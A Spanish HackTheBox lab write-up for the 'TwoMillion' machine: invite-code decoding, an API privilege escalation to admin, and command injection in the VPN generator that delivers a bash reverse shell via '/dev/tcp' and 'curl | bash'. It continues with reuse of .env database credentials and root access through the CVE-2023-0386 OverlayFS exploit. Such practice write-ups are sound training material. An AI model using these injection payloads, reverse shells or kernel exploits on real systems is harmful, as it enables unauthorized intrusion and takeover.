---
title: TwoMillion - Easy (HTB)
tags:
permalink: /TwoMillion-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

`TwoMillion` es una caja de Linux de dificultad fácil que se lanzó para celebrar llegar a `2 millones` de usuarios en HackTheBox. La caja cuenta con una versión antigua de la plataforma `HackTheBox` que incluye el antiguo código de invitación hackable. Después de hackear el código de invitación se puede crear una cuenta en la plataforma. La cuenta se puede utilizar para enumerar varios puntos finales de la `API`, uno de los cuales se puede utilizar para elevar al usuario a un administrador. Con acceso administrativo, el usuario puede realizar una `inyección de comandos` en el punto final de generación de VPN de administración obteniendo así un shell del sistema. Se encuentra un archivo `.env` que contiene credenciales de base de datos y se debe a la reutilización de contraseñas, los atacantes pueden iniciar sesión como administrador de usuario en el cuadro. Se encuentra que el núcleo del sistema está desactualizado y `CVE-2023-0386` se puede utilizar para obtener una shell `root`.

# Reconocimiento

Empezamos con un escaneo de la red con `nmap` para detectar puertos y servicios que corren para esta.

```bash
nmap -p 22,80 -sCV 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 17:00 EDT
Nmap scan report for 10.10.10.11
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds
```

Vemos que en el puerto `80` corre el servicio `Http` con una pagina similar a la de `Hack The Box` con la interfaz antigua.

![image-20230602171207436](images/image-20230602171207436.png)

Si intentamos loguearnos vamos a ver que no podemos ya que no tenemos credenciales validas, pero hay un botón que nos redirige a una pagina en la cual tenemos que brindar algún tipo de código de invitación

![image-20230606145819478](images/image-20230606145819478.webp)

## Shell as www-data

Si entramos a la consola vemos que se carga desde la ruta `js/inviteapi.min.js` y es ahí donde vemos un par de funciones dentro de las cuales esta `verifyInviteCode` o `makeInviteCode`, por lo que desde la consola del navegador podemos intentar llamar a estas funciones para ver que nos devuelve o que hace cada función y nos devuelve lo siguiente.

`Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr` la cual parece por lo que dice en el mismo mensaje, una cadena encriptada con `ROT13`

![Untitled 19 1](images/Untitled 19 1.jpg)

Por lo que para desencriptarla hacemos escribimos los siguiente en la consola.

```bash 
echo Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr | tr 'A-Za-z' 'N-Zz-nM-Aa-m'
```

Lo que nos deja con este mensaje : `In order to generate the invite code, make a POST request to /api/v1/invite/generate`.
Por lo que con `curl` enviamos una petición por `POST` a esa ruta. El cual nos da codigo en `base64` el cual podemos decodificar el cual nos da el codigo de invitacion para poder registrarnos y loguearnos en la pagina.

```bash
curl -X POST http://2million.htb/api/v1/invite/generate -s | jq .
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "MlFUVkctMExKQ1YtWlJSTkItSkZJSk8=",
    "format": "encoded"
  }
}
```

```bash 
echo "MlFUVkctMExKQ1YtWlJSTkItSkZJSk8=" | base64 -d 
```

Codigo de invitacion:
`2QTVG-0LJCV-ZRRNB-JFIJO`

Usando el mismo ya me puedo loguear en la pagina, ya una vez logueados en la pagina vemos la antigua interfaz de `Hack The Box` 

![image-20230602180451178](images/image-20230602180451178.png)

Y que si enumeramos vemos que en la sección `Access` podemos descargarnos una `vpn` con la cual si con `burpsuite` interceptamos como se envían los datos, a que ruta y demás. vemos que se hace una petición a la ruta `api/v1/user/vpn/generate` por lo que podemos intentar enumerar los `endpoints` de la api en cuestión enviando una petición a la ruta `api/v1`, lo cual nos devuelve lo siguiente.

```bash
curl -X GET http://2million.htb/api/v1 -H "Cookie: PHPSESSID=o7go1b93v5ig3p697r3anut64d" | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   800    0   800    0     0    499      0 --:--:--  0:00:01 --:--:--   499
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Vemos que hay rutas para usuarios administradores de la pagina los cuales tienen `endpoints` de verificación de su rol (`admin`) y de generación de `VPNs`, pero vemos una ruta la cual puede llamar la atención la cual es `api/v1/admin/settings/update` con la q podemos abusar para poder asignar algún rol privilegiado de la pagina, para luego poder chequear si nos convierte en dicho rol, así que pasos a seguir: 

- Enviar una petición la cual nos cambie el rol a `admin`. 
- Verificar que se nos haya seteado dicho rol.
- Generar una vpn como admin para ver que resultado obtenemos.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=o7go1b93v5ig3p697r3anut64d" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    53    0    53    0     0     30      0 --:--:--  0:00:01 --:--:--    30
{
  "status": "danger",
  "message": "Invalid content type."
}
```

Vemos que nos pide un `Content-Type` del cual antes en la revisión del código de la pagina principal dentro de las funciones aparecía `JSON` lo cual nos hace pensar que podría necesitar eso y dichos campos , como el `email`, y como vemos en esta imagen el de `is_admin`.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=o7go1b93v5ig3p697r3anut64d" -H 'Content-Type: application/json' -d '{"email": "zs1n@zs1n.com"}'| jq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    85    0    59  100    26     34     15  0:00:01  0:00:01 --:--:--    50
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Nos pide que en vez de `true` lo seteemos a `1`, así que lo hacemos y pasamos a verificar que nuestro rol se haya asignado.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=o7go1b93v5ig3p697r3anut64d" -H 'Content-Type: application/json' -d '{"email": "zs1n@zs1n.com", "is_admin" : "True"}'| jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   123    0    76  100    47     45     28  0:00:01  0:00:01 --:--:--    73
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Cambiamos a `1`.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=o7go1b93v5ig3p697r3anut64d" -H 'Content-Type: application/json' -d '{"email": "zs1n@zs1n.com", "is_admin" : 1}'| jq      
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    82    0    40  100    42     24     25  0:00:01  0:00:01 --:--:--    49
{
  "id": 13,
  "username": "zs1n",
  "is_admin": 1
}
```

Nos devuelve un `true` por lo que podemos pasar al ultimo paso y como deduzco que las `vpn` se configuran en `bash` intuyo que quizás podamos escapar del parámetro `username` para poder ejecutar comandos. Así que podemos ver si al intentar enviar con `curl` una petición a nuestra `ip` quizás obtengamos una solicitud desde el lado del servidor victima.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=o7go1b93v5ig3p697r3anut64d" -H 'Content-Type: application/json' -d '{"username":"zs1n"}'
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
DAgybWlsbGlvbjEhMB8GCSqGSIb3DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MB4X
DTIzMDUyNjE1MDIzM1oXDTIzMDYyNTE1MDIzM1owgYgxCzAJBgNVBAYTAlVLMQ8w
DQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjETMBEGA1UECgwKSGFja1Ro
ZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQDDAgybWlsbGlvbjEhMB8GCSqGSIb3
DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MIICIjANBgkqhkiG9w0BAQEFAAOCAg8A
MIICCgKCAgEAubFCgYwD7v+eog2KetlST8UGSjt45tKzn9HmQRJeuPYwuuGvDwKS
JknVtkjFRz8RyXcXZrT4TBGOj5MXefnrFyamLU3hJJySY/zHk5LASoP0Q0cWUX5F
[..snip..]
```

Probando por una inyeccion de comandos.

```BASH
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=o7go1b93v5ig3p697r3anut64d" -H 'Content-Type: application/json' -d '{"username":"zs1n; id;"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

 Por lo que con éxito ahora ya me cree un `index.html` con con una `reverse shell`dentro la cual el servidor lo interprete o ejecute con `bash` para así poder ganar acceso a la maquina.
 
```bash 
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.8/4444 0>&1'
```

Ejecutamos el comando con `curl`.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=o7go1b93v5ig3p697r3anut64d" -H 'Content-Type: application/json' -d '{"username":"zs1n; curl http://10.10.17.19/index.html | bash;"}'
```

Y desde mi listener `nc` recibo mi shell.
```bash 
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.66] 38776
bash: cannot set terminal process group (1068): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ whoami
whoami
www-data
```

## Shell as admin

Ya una vez dentro estamos como `www-data` y que si listamos los archivos y carpetas dentro de la ruta en la que la pagina se aloja vemos un archivo `.env` extraño. El cual si lo cateamos vemos unas credenciales del usuario `admin`.

```bash
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Nov 11 00:50 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Nov 11 00:50 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
```

```bash
www-data@2million:~/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Las probamos para loguearnos por `ssh`  o bien cambiar al usuario con sus credenciales, ya que vimos en el `/etc/passwd` este usuario tiene una `bash` asignada como `shell`.

```bash
www-data@2million:~/html$ su admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:/var/www/html$
```

```bash
admin@2million:~$ cat user.txt 
ae71ecb4be145ac730a07e100bc1503d
```

## Shell as root

Si nos logueamos via `ssh`, podemos ver que hay un mensaje que dice `You have mail`, entonces si vamos a la ruta `/var/mail` vemos un archivo `admin` lo cual dice lo siguiente:

```bash
admin@2million:/var/mail$ cat admin                                                                                                                                                        
From: ch4p <ch4p@2million.htb>                                                                                                                                                             
To: admin <admin@2million.htb>                                                                                                                                                             
Cc: g0blin <g0blin@2million.htb>                                                                                                                                                           
Subject: Urgent: Patch System OS                                                                                                                                                           
Date: Tue, 1 June 2023 10:45:22 -0700                                                                                                                                                      
Message-ID: <9876543210@2million.htb>                                                                                                                                                      
X-Mailer: ThunderMail Pro 5.2                                                                                                                                                              
                                                                                                                                                                                           
Hey admin,                                                                                                                                                                                 
                                                                                                                                                                                           
I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.                                                                                                 

HTB Godfather

```

El mensaje le dice al `admin` que si puede upgradear el `OS` del la web host, ya que vieron que hay varios `CVEs` sobre el `Kernel de linux` , mas en concreto en el `OverlayFS / Fuse` el cual no tiene buena pinta. y si buscamos por dichos `CVEs` vemos que hay uno el cual es el `CVE-2023-0386`.
Contexto: `OverlayFS` permite que varios sistemas de archivos se combinen en una vista única la cual se usa comunmente en los contenedores, La cual tiene una capa `lower` y una `upper` que cuando un archivo con el bit `SUID` proviene de un montaje `nosuid` (La cual es una capa que debería ignorarse) se copia a otro montaje sin la verificación del `kernel` o no lo verifica correctamente lo que puede desencadenar en permisos peligrosos. En resumen, el exploit se basa en que dentro de un `user namespace`, un usuario de bajos privilegios pueda aparentar tener los privilegios del usuario `root`, para posteriormente pasar a montar un `OverlayFS` y copiar un archivos con el bit `SUID` dentro de una ruta accesible como `/tmp`, a continuación un exploit.

Nos clonamos el repositorio.
```bash 
git clone https://github.com/xkaneiki/CVE-2023-0386/ 
```

Lo comprimo en `.tar` para enviarlo a la maquina victima.
```bash 
tar -cvjf cve.tar CVE-2023-0386/
```

Y lo enviamos a la maquina victima para explotarlo.

```bash 
python3 -m http.server 80 
```

Desde la maquina victima.
```bash 
wget http://<IP>/cve.tar
```

```bash 
tar -xjf cve.tar
```

Y nos abrimos dos consolas victimas y en la primera hacemos esto.

```bash 
make all
```

```bash 
./fuse ./ovlcap/lower ./gc
```

Y desde la segunda.

```bash 
./exp
```

```bash
admin@2million:/tmp/CVE-2023-0386$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Nov 11 01:04 .
drwxr-xr-x 6 root   root     4096 Nov 11 01:04 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# 
```

```bash 
root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
82bde7a931550be96ddb3869b7a87348
```

`~Happy Hacking.`
